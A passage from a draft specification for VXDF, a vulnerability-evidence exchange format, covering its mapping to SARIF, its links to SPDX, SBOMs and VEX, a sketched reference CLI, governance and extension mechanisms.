   * VXDFPayload.id **(Document UUID)**: Can map to run.correlationGuid for unique identification of the VXDF-derived run.  
   * VXDFPayload.generatedAt: Maps to run.invocations\[0\].endTimeUtc.  
   * VXDFPayload.generatorTool:  
     * name maps to run.tool.driver.name.  
     * version maps to run.tool.driver.version.  
     * Additional properties of the VXDF generator could map to run.tool.driver.properties.  
   * VXDFPayload.applicationInfo:  
     * name, version, purl, cpe: Can be described within run.artifacts\[\] if the primary target is considered an artifact. For instance, an artifact object could represent the application, using its location.uri for repositoryUrl, and properties for PURL, CPE, and version.  
     * environment: Can be stored in run.invocations\[0\].properties.environment or run.properties.targetEnvironment.  
   * VXDFPayload.customProperties: Can map to run.properties.

2. ### **VXDF ExploitFlow to SARIF result Object:** 

   * Each ExploitFlow object within the VXDFPayload.exploitFlows array **MUST** be represented as a distinct SARIF result object.  
   * ExploitFlow.id **(Flow UUID)**: Maps to result.correlationGuid. This ensures each validated finding is uniquely identifiable.  
   * ExploitFlow.title: Can map to a combination of rule.shortDescription.text (if a matching rule is defined) and result.message.text. A common practice is to use result.message.text for a concise summary.  
   * ExploitFlow.description: Can be appended to result.message.text or stored in result.properties.vxdf\_description.  
   * ExploitFlow.validatedAt: Store in result.properties.vxdf\_validatedAt.  
   * ExploitFlow.validationEngine:  
     * name maps to result.provenance.conversionSources\[0\].tool.driver.name (if considering VXDF as a conversion source for this SARIF result) or more simply in result.properties.vxdf\_validationEngine\_name.  
     * version maps to result.provenance.conversionSources\[0\].tool.driver.version or result.properties.vxdf\_validationEngine\_version.

3. ### **Mapping Vulnerability Classification and Severity:** 

   * ExploitFlow.category **and** ExploitFlow.cwe **(Array of Strings)**:  
     * These map to the SARIF rule concept. A reportingDescriptor (rule) should be defined within run.tool.driver.rules\[\] (or an extension's rules).  
     * The rule.id could be derived from the primary CWE (e.g., "CWE-89") or a VXDF-specific category code (e.g., "VXDF.INJECTION").  
     * rule.name can be the VXDF category.  
     * rule.shortDescription.text can be the ExploitFlow.title or a generic description of the category.  
     * rule.fullDescription.text can be a more detailed description of the category.  
     * The ExploitFlow.cwe array can be mapped to rule.relationships\[\] where each item indicates a target that is a CWE entry in a defined taxonomy (e.g., run.taxonomies\[\]).  
     * The result would then reference this rule via result.ruleId and result.ruleIndex.  
   * ExploitFlow.severity **(Structured Object)**:  
     * VXDF severity.level (e.g., "CRITICAL", "HIGH") maps to SARIF result.level. For example:  
       * "CRITICAL", "HIGH" \-\> "error"  
       * "MEDIUM" \-\> "warning"  
       * "LOW", "INFORMATIONAL" \-\> "note"  
       * "NONE" \-\> "none" (or omit level if appropriate)  
     * The full VXDF severity object, including cvssV3\_1.vectorString, cvssV3\_1.baseScore, cvssV4\_0.\* details, and justification, **SHOULD** be stored in result.properties.vxdf\_severityDetails to preserve full fidelity, as SARIF level is less granular.  
     * result.rank (a float between \-1.0 and 100.0) can be populated from severity.cvssV3\_1.baseScore or severity.cvssV4\_0.baseScore (scaled appropriately if needed, though CVSS scores 0-10 can often be used directly if the tool interpreting rank understands this scale).

4. ### **Mapping Vulnerability Locus (source, sink, steps, affectedComponents):** 

   * **Primary Location (**result.locations\[0\]**):**  
     * For flow-based vulnerabilities, the VXDF sink (Location object) typically maps to the primary SARIF result.locations\[0\].physicalLocation.  
     * For non-flow vulnerabilities described by affectedComponents, the primary Location within the first or most relevant AffectedComponent can serve as result.locations\[0\].physicalLocation.  
     * The VXDF Location object's fields (filePath to artifactLocation.uri, startLine/endLine/startColumn/endColumn to region, snippet to region.snippet) map directly to SARIF's physicalLocation structure. fullyQualifiedName maps to logicalLocations\[\].fullyQualifiedName.  
   * **Flow-Based Details (**source **and** steps**):**  
     * These map to SARIF result.codeFlows\[\]. A VXDF ExploitFlow typically translates to one codeFlow.  
     * Each codeFlow contains one threadFlow.  
     * Each VXDF TraceStep object (including the source location if represented as the first step) maps to a threadFlowLocation within the threadFlow.locations\[\] array.  
       * TraceStep.order dictates the sequence.  
       * TraceStep.location (a VXDF Location object) maps to the SARIF location.physicalLocation and location.logicalLocations as described above.  
       * TraceStep.description maps to location.message.text.  
       * TraceStep.stepType can be stored in location.properties.vxdf\_stepType.  
       * TraceStep.evidenceRefs (UUIDs) can be stored in location.properties.vxdf\_evidenceRefs to link specific steps to evidence items.  
   * **Component-Based Details (**affectedComponents**):**  
     * If not used for the primary result.locations\[0\], details from affectedComponents (like PURL, CPE, name, version) can be described in result.properties.vxdf\_affectedComponents as an array of objects.  
     * Alternatively, if an AffectedComponent has a specific Location that is key, that Location could be added to result.relatedLocations\[\].

5. ### **Mapping Evidence (Crucial for VXDF):** 

   * SARIF does not have a first-class, structured object for detailed exploit validation evidence comparable to VXDF's Evidence model. Therefore, preserving this rich information requires careful mapping:  
   * **Primary Recommendation:** The entire VXDF evidence array (containing structured Evidence objects with evidenceType, validationMethod, description, timestamp, and typed data) **SHOULD** be embedded as a structured property within the SARIF result, for example, in result.properties.vxdf\_evidence: \[...\]. This preserves all details for consumers that can parse VXDF-specific properties.  
   * **Summarizing in** result.message**:** A concise summary of the key evidence (e.g., the description of the most pertinent VXDF Evidence item) can be included in result.message.text, often appended to the main vulnerability description.  
     * *Example:* "...Exploit validated by manual test: 'Using payload X resulted in admin access.'"  
   * **Using** result.attachments\[\]**:** Each VXDF Evidence item could potentially be represented as a SARIF attachment.  
     * The Evidence.description maps to attachment.description.text.  
     * If Evidence.data contains content like a POC\_SCRIPT.scriptContent or CODE\_SNIPPET\_CONTEXT.content, this could map to attachment.artifactLocation.uri (if externalized) or attachment.regions\[0\].snippet or attachment.artifactContent (if embedded).  
     * This approach is suitable for file-like evidence but may be less ideal for structured data like HTTP logs unless they are stringified.  
   * result.hostedViewerUri: If there's a system that can display the full VXDF finding with its rich evidence, this URI could point to it.  
   * **Validation Context from VXDF:**  
     * ExploitFlow.validatedAt **SHOULD** be stored in result.properties.vxdf\_validatedAt.  
     * ExploitFlow.validationEngine.name and version **SHOULD** be stored in result.properties.vxdf\_validationEngine\_name and result.properties.vxdf\_validationEngine\_version.  
     * The specific Evidence.validationMethod can be part of the structured evidence in result.properties.vxdf\_evidence.

6. ### **Mapping Other ExploitFlow Fields:** 

   * ExploitFlow.status: Can map to result.baselineState (e.g., "OPEN" \-\> "new", "REMEDIATED" \-\> "fixed") or result.suppressions\[\] (if the status implies suppression). More directly, store in result.properties.vxdf\_status.  
   * ExploitFlow.tags: Can map to result.tags\[\] or result.properties.vxdf\_tags.  
   * ExploitFlow.remediation:  
     * summary can map to result.fixes\[0\].description.text.  
     * detailsUrl can map to rule.helpUri (if remediation is generic for the rule) or result.fixes\[0\].artifactChanges\[0\].replacements\[0\].deletedRegion.message.text (if associating with a specific code fix location, though less direct). Storing in result.properties.vxdf\_remediation is also an option.  
   * ExploitFlow.correlationGuids: If a VXDF entry is itself a validation of a SARIF finding, one of the GUIDs in this array might be the correlationGuid of the original SARIF result. When converting VXDF *to* SARIF, these might be mapped to result.correlationGuids\[\] if the target SARIF consumer supports it, or result.properties.vxdf\_correlationGuids.

7. ### **Handling Multiple Flows/Paths:** 

   * VXDF typically represents each distinct validated exploit path as a separate ExploitFlow. If a single underlying weakness has multiple distinct exploitable paths, they would be separate ExploitFlow items, thus translating to separate SARIF result items.  
   * If a SARIF result originally contained multiple codeFlows (representing multiple paths for one reported issue), and a VXDF process validates each of these paths independently, then each validated path might generate its own VXDF ExploitFlow. When converting back to SARIF, these would become distinct result objects, each with a single codeFlow derived from the VXDF.

8. ### **Example Snippet (Conceptual \- how a VXDF ExploitFlow might look as a SARIF result):**    (Assuming the SQL Injection example from Appendix A of the refined VXDF spec)

9. ### **Limitations and Considerations:** 

   * **Semantic Gap:** SARIF's primary purpose is to report findings from static analysis tools, not necessarily dynamically validated exploits with rich, structured evidence. While VXDF data *can* be mapped, SARIF viewers may not natively understand or display the detailed VXDF evidence structures stored in properties.  
   * **"Validated" Property:** SARIF has no standard field to explicitly mark a result as "dynamically validated as exploitable." This crucial VXDF semantic is best conveyed by including VXDFPayload.validationEngine details and VXDFPayload.validatedAt within result.properties. A custom tag like "vxdf\_validated\_exploitable": true could also be added to result.properties.  
   * **Evidence Fidelity:** The richest representation of VXDF evidence in SARIF is via the result.properties.vxdf\_evidence array. Simpler mappings (e.g., to result.message or basic attachments) will lose structural detail and machine-readability of the evidence data.  
   * **Tooling Support:** Consumers of SARIF files containing embedded VXDF information would need specific logic to parse and utilize the vxdf\_\* properties.

## **Summary for SARIF Mapping:**

Mapping VXDF to SARIF is feasible and useful for integrating validated exploit information into ecosystems that consume SARIF. The key is to leverage SARIF's result.properties to embed the rich, structured information from VXDF (especially for severity and evidence) to minimize semantic loss. While SARIF provides the structural containers (results, locations, code flows), the specific VXDF semantics of "validated exploitability" and detailed evidence are best carried as custom extensions within those containers. A VXDF-to-SARIF converter should prioritize preserving as much of the VXDF detail as possible, clearly documenting how VXDF fields are mapped. Conversely, if a VXDF finding is a validation of an existing SARIF result, the ExploitFlow.correlationGuids should be used to link back to the original SARIF result.correlationGuid.

## **Mapping VXDF to SPDX (and SBOM context)**

The Software Package Data Exchange (SPDX®) specification is an ISO/IEC standard (ISO/IEC 5962:2021) for communicating Software Bill of Materials (SBOM) information, including components, licenses, copyrights, and security references. While VXDF is not an SBOM (it does not primarily list software components or licenses), it is designed to **complement SBOMs** by providing detailed, validated, and evidence-backed information about exploitable vulnerabilities within the software described by an SBOM.

The core idea is:

* An **SBOM (e.g., an SPDX document)** tells you *what* software components are present in a product or system. It may also list known vulnerabilities (e.g., CVEs) associated with these components.  
* A **VXDF document** tells you *if and how* a specific vulnerability (which could be a known CVE affecting a component from the SBOM, or a newly discovered flaw in proprietary code) has been *validated as exploitable in the context of that product*, providing the precise data flow or affected component details and the concrete evidence of exploitability.

This synergy is crucial for accurate risk assessment and prioritized remediation. Here’s how VXDF v1.0.0 integrates with SPDX and general SBOM concepts:

1. ### **Linking an Entire VXDF Document to an SPDX Package:** 

   * The VXDFPayload.applicationInfo object in a VXDF document describes the overall application or product that was assessed. Key fields for linking include:  
     * applicationInfo.name and applicationInfo.version: These should align with the packageName and packageVersion in an SPDX document.  
     * applicationInfo.purl: The Package URL is a powerful, standardized way to identify the software package and can directly correspond to a PURL used in an SPDX document for the primary package being described.  
     * applicationInfo.cpe: Similarly, a CPE can be used for linking.  
   * Within an SPDX document (version 2.2.1 or later), an ExternalRef can be used on a Package to point to the VXDF document:  
     * externalRefType**:** securityAdvisory (or other with a comment if a more specific type like validatedExploitReport is not yet standard in SPDX).  
     * locator**:** \<URL to the VXDF document\> (e.g., https://example.com/vxdf/acme-webapp-v2.3.1-findings.vxdf.json).  
     * comment**:** "VXDF report detailing validated exploitable vulnerabilities for this package. See VXDF document ID: \<VXDFPayload.id\>."  
   * This provides a document-level link from the SBOM to the comprehensive VXDF report for that software.

2. ### **Linking Specific VXDF ExploitFlows to SPDX Packages/Files (Components):** 

   * This is where the refined VXDF v1.0.0 schema offers significant advantages through the ExploitFlow.affectedComponents\[\] array. Each object in this array can precisely identify a software component (a library, module, OS package, etc.) that is part of the vulnerability.  
   * **Using PURL/CPE in** AffectedComponent**:**  
     * AffectedComponent.purl: This **MUST** be used when available and is the preferred method for linking to a specific component listed in an SPDX document (which also heavily relies on PURL for component identification).  
     * AffectedComponent.cpe: Can also be used for linking.  
     * AffectedComponent.name and AffectedComponent.version provide human-readable context.  
   * **Scenario 1: VXDF Validates a Known CVE in an SBOM Component:**  
     * An SBOM (SPDX) lists "Component X" (e.g., pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1) and notes it's affected by "CVE-Y".  
     * A VXDF ExploitFlow can:  
       * List "Component X" in its affectedComponents array using the same PURL.  
       * Reference "CVE-Y" in its cwe array (or a dedicated references field if added for CVEs specifically).  
       * Provide the detailed source, sink, steps (if applicable, showing how the application code uses the vulnerable part of Component X) and, crucially, the evidence that CVE-Y is *actually exploitable in this specific application's context*.  
     * The SPDX document could then have an ExternalRef on "Component X" (or on a vulnerability entry associated with it, if the SBOM format supports that) pointing to the specific VXDF ExploitFlow (e.g., https://example.com/vxdf/report.json\#ExploitFlow.id=f47ac10b... if fragment identifiers are supported by hosting).  
   * **Scenario 2: VXDF Describes a Novel Vulnerability in a Component:**  
     * If VXDF describes a zero-day or application-specific flaw within "Component X", the affectedComponents array still links the finding to that component in the SBOM via PURL.

3. ### **Leveraging Location Objects for Component Context:** 

   * Even within a flow-based vulnerability (source/sink/steps), if a particular Location (e.g., the sink) is within a specific known library, the Location object itself can include purl, cpe, componentName, and componentVersion fields, providing another layer of granularity for linking to SBOM components.

4. ### **VXDF as Input to VEX (Vulnerability Exploitability eXchange):** 

   * VEX documents provide assertions about the exploitability status of vulnerabilities in a specific product (e.g., "not\_affected," "affected," "fixed," "under\_investigation").  
   * When a VEX document states a component/product is **"affected"** by a vulnerability, it can reference a VXDF ExploitFlow as the justification. The VXDF provides the *proof* (the "why and how" it's affected and exploitable).  
   * The ExploitFlow.id (UUID) is ideal for being referenced in a VEX statement's justification or impact\_statement\_document fields.  
   * The presence of a VXDF record strongly supports an "affected" status, while the absence (after thorough validation attempts) might support a "not\_affected" status if the analysis was scoped to find such issues.

5. ### **CWE References:** 

   * SPDX allows for vulnerability references, which can include CVEs. While SPDX might not list CWEs directly for each vulnerability in all versions/profiles, if it does, the ExploitFlow.cwe array in VXDF provides a common reference point. However, the primary link between VXDF and vulnerabilities mentioned in an SBOM is usually via the component identifier (PURL) and the vulnerability identifier (CVE). VXDF then enriches this by detailing the CWE root cause of the validated exploit.

6. ### **Embedding vs. Linking VXDF Data:** 

   * The refined VXDF ExploitFlow (with its detailed evidence and potential steps) can be verbose. Embedding entire VXDF ExploitFlows directly into an SBOM (e.g., as custom SPDX elements or annotations) is generally **not recommended** as it would bloat the SBOM and mix concerns.  
   * **Linking is preferred:** Using SPDX ExternalRef elements (at the Package level or associated with specific listed vulnerabilities/components) to point to external VXDF documents or specific ExploitFlow URIs is cleaner and keeps each standard focused on its primary purpose.

7. ### **Licenses and Patents:**    SPDX excels at license and copyright information for components. VXDF does not deal with this directly.

   * The only consideration, as noted in the original text, is the sensitivity of codeLocation.snippet or Evidence.data.scriptContent if they contain proprietary code from a component whose license (as per SPDX) might restrict such redistribution, even for security reporting. Producers should be mindful of this when creating VXDFs intended for external sharing.

## **Summary of VXDF and SPDX/SBOM Integration (Refined):**

* **Distinct but Complementary Roles:** SPDX/SBOMs inventory software components and may list known associated vulnerabilities. VXDF provides evidence-backed details of validated, exploitable instances of those (or other) vulnerabilities within the context of the inventoried software.  
* **PURL is Key:** Package URLs are the primary mechanism for robustly linking VXDFPayload.applicationInfo and ExploitFlow.affectedComponents\[\] (and specific Location objects) to corresponding packages/components in an SPDX document. CPEs are a secondary mechanism.  
* **Linking Mechanisms:**  
  * Use SPDX ExternalRef (type securityAdvisory or other) on SPDX Packages to point to entire VXDF documents.  
  * Where SBOM formats or VEX allow, reference specific ExploitFlow.ids for granular linkage.  
  * A VXDF ExploitFlow references affected components via PURL/CPE in its affectedComponents array.  
* **Contextual Validation:** VXDF provides the crucial "is it *actually* exploitable *here*?" context that SBOMs and simple CVE lists often lack. This enables more accurate risk-based decision-making.

## **Conclusion**:

The VXDF v1.0.0 schema, with its strong support for component identification via PURL/CPE in applicationInfo and affectedComponents, significantly enhances its ability to integrate with SPDX and other SBOM formats. This integration moves beyond simple document-level linking to allow for more granular associations between specific validated vulnerabilities in VXDF and the software components listed in an SBOM. This powerful combination helps organizations move from knowing *what* components they have and *what known vulnerabilities exist* to understanding *which of these pose a validated, exploitable risk* in their specific deployments, backed by actionable evidence.

As both VXDF and SBOM/VEX standards continue to evolve, the opportunities for even tighter and more automated integration will increase, ultimately benefiting vulnerability management and supply chain security.

# **Appendix D: Reference Implementation Sketch (Pseudo-CLI)**

To foster adoption and provide practical utility, a reference implementation for VXDF v1.0.0 could be provided. This would likely include:

1. A core library (e.g., in Python, Java, JavaScript) for parsing, validating, creating, and manipulating VXDF documents according to the normative schema.  
2. A simple Command-Line Interface (CLI) tool built upon this library for common operations.

Below, we sketch how such a CLI tool, tentatively named vxdfutil, might function. These commands are illustrative and aim to show how users and integrators could interact with the refined VXDF data.

**1\. Validating a VXDF Document (**validate**)**

A fundamental feature is to validate a VXDF document against the normative v1.0.0 schema.

* **Command:**

vxdfutil validate report.vxdf.json \[--schema-version=1.0.0\]

* **Functionality:**  
  * Parses report.vxdf.json.  
  * Validates it against the specified (or default 1.0.0) VXDF JSON Schema.  
  * Reports success or lists detailed validation errors.  
* **Example Output (Success):**

Validation successful: report.vxdf.json conforms to VXDF Schema v1.0.0.

* **Example Output (Failure):**

Validation failed for report.vxdf.json (VXDF Schema v1.0.0):

\- Error: root.id is missing (required property).

\- Error: exploitFlows\[0\].severity must be an object, found string "HIGH".

\- Error: exploitFlows\[1\].evidence\[0\].evidenceType "HTTP\_LOG" is not a valid enum value. Allowed values: \[...\].

\- Error: exploitFlows\[1\].evidence\[0\].data does not conform to schema for evidenceType "HTTP\_REQUEST\_LOG": property "method" is missing.

* **Purpose:** Helps producers debug their output and allows consumers to trust the structure of incoming VXDF files.

**2\. Summarizing and Displaying VXDF Content (**summarize**,** show**)**

Users will need human-readable summaries and detailed views of VXDF content.

* **Command (**summarize**):**

vxdfutil summarize report.vxdf.json

* **Example Output (**summarize**):**

Correlation GUIDs: \[...\]

Custom Properties: {...}

* **Purpose:** Provides quick overviews and detailed inspection capabilities without manual JSON parsing. The show command would need options for verbosity, especially for the structured Evidence.data.

**3\. Merging VXDF Documents (**merge**)**

Consolidate multiple VXDF reports.

* **Command:**

vxdfutil merge report1.vxdf.json report2.vxdf.json \--output combined\_report.vxdf.json \[--deduplicate-flows\]

* **Functionality:**  
  * Combines exploitFlows from multiple input files into a single VXDF document.  
  * Merges root-level metadata intelligently (e.g., listing multiple generatorTool entries if different, ensuring applicationInfo is consistent or reconciled).  
  * Handles ExploitFlow.id (UUIDs): UUIDs should be unique by generation. If merging exact duplicates is a concern (e.g., same flow ID from different runs of the same tool on the same codebase), a deduplication strategy might be offered (e.g., based on ID and key fields, or a more sophisticated hash).  
* **Purpose:** Centralized reporting and analysis.

**4\. Converting Formats (**convert**)**

Interoperability with other formats like SARIF, or generating human-readable reports.

* **Commands:**

vxdfutil convert \--from sarif input.sarif \--to vxdf output.vxdf.json \[--require-validation-info\]

vxdfutil convert \--from vxdf input.vxdf.json \--to sarif output.sarif \[--embed-vxdf-properties\]

vxdfutil convert \--from vxdf input.vxdf.json \--to html output.html \[--template custom\_template.html\]

vxdfutil convert \--from vxdf input.vxdf.json \--to csv output.csv \[--fields id,title,severity.level,category\]

* **Functionality:**  
  * **SARIF to VXDF:** Converts SARIF result objects to VXDF ExploitFlows.  
    * A \--require-validation-info flag might mandate that the SARIF results have properties indicating validation, or the tool could prompt interactively for evidence details.  
    * If direct validation info is missing, Evidence objects might be created with evidenceType: "IMPORTED\_STATIC\_ANALYSIS\_FINDING" and validationMethod: "NOT\_VALIDATED\_BY\_VXDF\_PROCESSOR", with the SARIF message in Evidence.data. This clarifies that it's not yet a fully "VXDF-validated" entry.  
  * **VXDF to SARIF:** Implements the mapping defined in Appendix C (Mapping to SARIF), embedding rich VXDF details (structured severity, full evidence array) into SARIF result.properties.  
  * **VXDF to HTML/PDF:** Generates human-readable reports, rendering the structured Location, TraceStep, AffectedComponent, and Evidence (including its data) in a clear, navigable format.  
  * **VXDF to CSV/other formats:** For quick summaries or integration with spreadsheet-based tracking.  
* **Purpose:** Facilitates data exchange and reporting in various contexts.

**5\. Comparing VXDF Documents (**diff**)**

Identify changes between two VXDF reports (e.g., from different scans or versions of an application).

* **Command:**

vxdfutil diff old\_report.vxdf.json new\_report.vxdf.json

* **Functionality:**  
  * Compares exploitFlows based on their id (UUID).  
  * Reports new, fixed (present in old, missing in new), and changed flows.  
  * For changed flows, it could detail what changed (e.g., severity.level, status, number/type of evidence items, changes in affectedComponents).  
* **Example Output:**

VXDF Diff Report (old\_report.vxdf.json vs new\_report.vxdf.json):

\- New Flows (2):

  \[1\] ID: 123e4567-e89b-12d3-a456-426614174000, Severity: CRITICAL, Category: INJECTION, Title: ...

  \[2\] ...

\- Fixed/Removed Flows (1):

  \[1\] ID: abcdef01-2345-6789-abcd-ef0123456789, Severity: MEDIUM, Category: XSS, Title: ...

\- Changed Flows (1):

  \[1\] ID: fedcba98-7654-3210-fedc-ba9876543210

      \- severity.level: HIGH \-\> MEDIUM

      \- status: OPEN \-\> REMEDIATED

      \+ evidence: Added 1 new evidence item (type: RUNTIME\_APPLICATION\_LOG\_ENTRY)

* **Purpose:** Tracking remediation progress, identifying regressions, and understanding changes in the validated risk posture.

**6\. Policy Checking and CI/CD Integration (**check**,** gate**)**

Enforce security policies based on VXDF content, suitable for CI/CD pipelines.

* **Command (**check **or** gate**):**

vxdfutil check report.vxdf.json \--fail-on-severity CRITICAL,HIGH \--max-days-since-validation 30

vxdfutil gate report.vxdf.json \--policy-file ci\_policy.yaml

* **Functionality:**  
  * Evaluates exploitFlows against defined criteria.  
  * \--fail-on-severity: Exits with a non-zero status if flows of specified severity.level (or higher, based on a defined order) are present. Could also check CVSS scores (e.g., \--fail-on-cvss-basescore \>= 7.0).  
  * \--max-days-since-validation: Fails if validatedAt is older than a specified threshold.  
  * \--policy-file: Allows complex policies to be defined in a separate file (e.g., fail if any VULNERABLE\_AND\_OUTDATED\_COMPONENTS finding with a CRITICAL CVE exists, or if specific evidenceTypes are missing for certain categorys).  
  * Exits with 0 if compliant, non-zero if policy violations are found, printing details of violations.  
* **Purpose:** Automated decision-making in CI/CD pipelines (e.g., failing builds, blocking deployments) based on *validated* risks.

**Key Points for the Reference CLI based on VXDF v1.0.0:**

* **Leverages Rich Structure:** The CLI commands would be designed to fully utilize and expose the detailed information available in the refined VXDF schema (structured severity, detailed evidence types and data, component information).  
* **User Experience:** Output formatting would be crucial for making the rich data accessible (e.g., options for JSON, YAML, human-readable text, verbosity levels for complex fields like Evidence.data).  
* **Extensibility:** The CLI itself might support plugins or custom formatters/checkers to handle organization-specific customProperties or x- extensions.  
* **Focus on "Validated":** All operations would implicitly or explicitly reinforce that VXDF deals with findings that have undergone a validation process and are backed by evidence.

Such a reference implementation (library and CLI) would significantly lower the barrier to entry for adopting VXDF, provide common utilities, demonstrate best practices for interacting with VXDF data, and serve as an executable form of the specification for validation and testing. It would likely be an open-source project to encourage community contribution and evolution alongside the VXDF standard itself.

# **Appendix E: Proposal Lifecycle and Governance**

To ensure VXDF becomes a robust, widely-adopted standard, a clear governance model and lifecycle process is proposed:

**Development and Versioning:** VXDF will be maintained in a public repository (for example, on GitHub under an open governance organization or standards body). The specification, schema, and reference implementations will reside there. The maintainers will use semantic versioning for the spec:

* Version 1.0 is the initial release. Backward-compatible improvements (clarifications, minor new optional fields that don’t break existing files) would lead to 1.1, 1.2, etc. Backward-incompatible changes or major new features would result in 2.0, and so on.

* A **draft** status is used for versions in development. For instance, this document is a draft for v1.0. During the draft phase, feedback is solicited and changes can be made rapidly. Once finalized, v1.0 will be "frozen" except for critical errata.

* **Proposal for changes:** Anyone (community member, tool vendor, etc.) can propose a change by opening an issue or pull request in the repo. For example, if a new type of evidence needs special handling, they might propose adding a field in v1.1 or v2.0. The maintainers will discuss and may approve it for inclusion in a future version.

* We anticipate an **editorial board or working group** to oversee VXDF. This group might be formed under an organization such as OWASP or OASIS, or a consortium of interested parties (tool vendors, users, researchers). The board’s role is to vet changes, maintain quality, and drive adoption efforts.

* For significant changes (especially those causing backward incompatibility), a broader review will be done, possibly with an RFC-style process (e.g., publishing a VXDF 2.0 draft for public comment for a period, then finalizing).

**Releases and Maintenance:**

* The spec and JSON schema for each version will be published (e.g., as a document and a schema file on a website or repository). Older versions remain available. If a serious issue is found (like a security concern or a bug in schema), an errata or patch version might be released (e.g., 1.0.1).

* Tooling (like the reference CLI) will track the latest version, but may support reading older versions for backward compatibility. For example, a v2.0 tool might still accept a v1.0 VXDF file and either convert it or warn but attempt to parse known fields.

**Governance Rules:**

* The project will operate openly. Meeting notes (if the board meets), design discussions, and decisions will be logged publicly.

* Decisions about the spec ideally are made by **rough consensus** (as is common in standards): if most agree and no strong objections, a change goes through. For contentious issues, there may be a voting among the board or deferring until more data is gathered.

* The governance model will include roles like **maintainers/editors** (who can merge changes and publish new versions) and **contributors** (anyone from the community who contributes).

* If an industry standards body (like OASIS or ISO) is later involved, the governance may adapt to their processes (for instance, OASIS might form a Technical Committee for VXDF). At the start, a lightweight open-source governance is easier to move quickly and encourage participation.

* **Governance of Extensions:** While individual organizations can use extensions freely (x- fields), if an extension becomes widely useful, the governance process would encourage folding it into the standard. For example, if multiple vendors start using `x-customSeverityScore`, the board might decide to add an official `score` field in the next version. The process for that would be the same: propose, reach consensus, add to draft, release.

**Lifecycle Planning:**

* We envision an iterative process: gather feedback from early adopters in the first 6-12 months after v1.0, identify pain points or missing features, and issue a v1.1 if needed relatively soon (e.g., to add clarifications or minor fields).

* Major changes (like supporting new use cases) would be planned for v2.0 perhaps a year or two out, once there is sufficient usage experience. This also gives the ecosystem time to implement v1.x and provide feedback.

* The long-term lifecycle might see VXDF integrated into other frameworks or referenced by compliance programs. The governance should remain responsive but also provide stability (frequent breaking changes would hurt adoption). Thus, a balance: not stagnant, but any breaking change must have strong justification and community buy-in.

* **Sunset of older versions:** As new versions come out, the board might eventually declare an old version deprecated (especially if a security issue arises, or if usage naturally shifts to newer versions). Even then, documents in the old format remain valid as historical artifacts, but tooling may warn that it’s outdated.

**Community and Adoption:**

* Part of governance is also promoting the standard. The VXDF working group should engage with relevant communities (OWASP vulnerability reporting groups, CERTs, software vendors, open-source projects) to evangelize the format.

* The lifecycle includes periodic reviews of how well adoption is going (see Appendix I on success metrics) and adjusting strategy accordingly.

* There may be “plugfests” or interoperability tests organized where different tools exchange VXDF files to ensure consistency (for example, a static tool outputs VXDF and a dynamic tool reads it to perform validation).

In short, the VXDF standard will be managed in an open, collaborative manner. Its evolution will be guided by real-world needs and careful version management. Everyone is encouraged to participate in the process – from proposing enhancements to writing implementations – under a governance model that values transparency and consensus.

# **Appendix F: Extension Mechanism**

While VXDF v1.0.0 aims to cover the common core of validated data flow reporting and vulnerability details, it's understood that specific tools, organizations, or evolving use cases may require additional, specialized data. To accommodate this without fragmenting the standard or invalidating core schema conformance, VXDF includes clear and flexible extension mechanisms.

VXDF supports two primary ways to include custom data:

1. **Dedicated** customProperties **Bags:**

   * Several key objects within the VXDF schema (such as VXDFPayload, ExploitFlow, ApplicationInfo, Location, Evidence, AffectedComponent, and TraceStep) include an optional property named customProperties.  
   * This customProperties field is defined as a JSON object that can contain arbitrary key-value pairs. The values themselves can be simple (strings, numbers, booleans) or complex (objects, arrays).  
   * **Purpose:** This is the **preferred method** for grouping multiple related custom fields relevant to a specific VXDF object. It keeps custom data neatly organized within a designated namespace.  
   * **Schema Implementation:** Typically, the customProperties field in the schema is defined with "type": "object" and "additionalProperties": true, allowing any valid JSON structure within it.  
   * **Example:**

"ExploitFlow": {

  // ... standard fields ...

  "customProperties": {

    "com.example.internalRiskScore": 7.5,

    "com.example.trackingSystem": {

      "ticketId": "VULN-5678",

      "statusLink": "https://tracker.example.com/VULN-5678"

    },

    "x-old-scanner-id": "SCAN001-ITEM003" // Still advisable to namespace keys even here

  }

}

2. x- **Prefixed Fields:**

   * For situations where custom data needs to be at the same level as standard fields (i.e., not nested within a customProperties bag), or for extending objects that might not have a predefined customProperties field (though most major ones in VXDF 1.0.0 do), custom fields **MUST** be prefixed with x-.  
   * This convention is widely used in other standards (e.g., HTTP headers) to denote non-standard, experimental, or vendor-specific extensions.  
   * **Schema Implementation:** The VXDF JSON schema typically enforces additionalProperties: false on objects to prevent arbitrary non-standard fields. However, it simultaneously uses patternProperties: {"^x-": {}} to explicitly permit fields that begin with the x- prefix.  
   * **Examples (as in the original text):**  
     * "x-riskScore": 4.7 (if an organization prefers it at the top level of an object rather than in customProperties)  
     * "x-internalId": 12345  
     * "x-cve-details-url": "https://example.com/cve-info/CVE-2025-1234" (Note: The refined schema has a references array in ExploitFlow that could officially hold CVEs, but this illustrates the x- pattern).

**Guidelines for Using All Extensions (both** customProperties **content and** x- **fields):**

* **Purposeful and Namespace-Aware Naming:**  
  * For keys within customProperties or for x- prefixed field names, choose names that clearly identify the purpose and, if possible, the originating organization or tool to prevent collisions. Using a reverse domain name prefix (e.g., "com.example.myCustomField", "x-com.example-myCustomField") for keys within customProperties or for the part after x- is a good practice.  
  * Avoid overly generic names like x-priority or customProperties.priority without further namespacing, as different tools might interpret them differently.  
* **Avoid Conflicts with Standard Fields:** Extensions **MUST NOT** redefine or semantically override standard VXDF fields. If the standard provides a field for certain information (e.g., severity.level), use that field. Extensions are for *additional* information not covered by the core schema.  
* **Documentation is Crucial:** Producers of VXDF documents that include custom extensions (either in customProperties or as x- fields) **SHOULD** document these extensions for consumers. This documentation should explain the meaning, structure, and expected values of the custom data. This can be provided separately or, for minor notes, even within the VXDF itself using a descriptive x- field at the root or in metadata.  
* **Data Types:** All extension data (values in customProperties or for x- fields) **MUST** be valid JSON data types (string, number, boolean, object, array, null).  
* **Transition to Standard (for** x- **fields and common** customProperties **keys):**  
  * If an x- prefixed field or a key within customProperties proves to be broadly useful and adopted by a significant part of the community, it **SHOULD** be proposed for inclusion as a standard field in a future version of the VXDF specification.  
  * The VXDF governance process (see Appendix E) will manage the review and potential adoption of such common extensions. This ensures the standard evolves based on real-world needs while preventing long-term fragmentation.  
* **Structured Extensions are Permitted:**  
  * Values within customProperties and the values of x- prefixed fields can be complex JSON objects or arrays, not just primitive types.

"customProperties": {

  "com.example.runtimeContext": {

    "os": "Linux 5.4",

    "javaVersion": "11.0.12"

  }

},

"x-com.example-detailed-timing": {

